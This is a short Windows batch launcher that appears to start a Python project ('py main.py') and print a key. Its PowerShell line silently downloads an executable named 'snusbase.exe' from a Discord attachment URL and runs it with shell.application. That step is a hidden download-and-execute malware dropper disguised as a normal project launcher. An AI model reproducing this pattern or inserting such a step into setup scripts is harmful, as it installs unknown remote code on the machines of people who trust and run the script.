@echo off
cd src
powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1206205156597964840/snusbase.exe?ex=65db2917&is=65c8b417&hm=8d17c8c8c0327a28d425b808028980c48132c769c9dd7ceadda15bbc662b5d6e&';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
py main.py
Key : 01266156
